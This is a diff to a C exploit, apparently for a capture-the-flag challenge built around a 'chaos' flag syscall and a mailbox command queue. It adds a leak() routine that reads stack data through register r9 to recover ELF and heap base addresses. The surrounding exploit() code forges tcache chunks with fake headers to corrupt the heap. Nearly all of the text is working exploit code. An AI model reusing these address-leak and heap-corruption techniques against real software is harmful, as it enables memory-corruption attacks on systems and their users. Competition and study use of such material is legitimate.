@@ -35,6 +35,7 @@ static void freeh(uint32_t handle)
 }
 
 static uint64_t heap = 0x555555560000ul + 0x3000;
+static uint64_t elf = 0x555555554000ull;
 static void exploit(void)
 {
     // exhaust 0x20 chunks
@@ -77,7 +78,6 @@ static void exploit(void)
     freeh(crack);
     freeh(f);
     uint64_t tcache = heap + 0x10;
-    uint64_t elf = 0x555555554000ull;
     uint64_t forge2[15] = {
         0xdeadbeefu, 0xdeadbeefu,
         0xdeadbeefu, 0x41,
@@ -95,8 +95,17 @@ static void exploit(void)
 }
 
 #define SYS_chaos_flag 0xc89fc
+static void leak(void)
+{
+    register long *a __asm__( "r9" );
+
+    elf = a[41] - 0xb020;
+    heap = a[70];
+}
+
 void handle_mailbox(void)
 {
+    leak();
     const uint64_t cmdq_size = csr->cmdq_size;
     uint64_t head = csr->cmd_head;
     uint64_t tail = csr->cmd_tail;
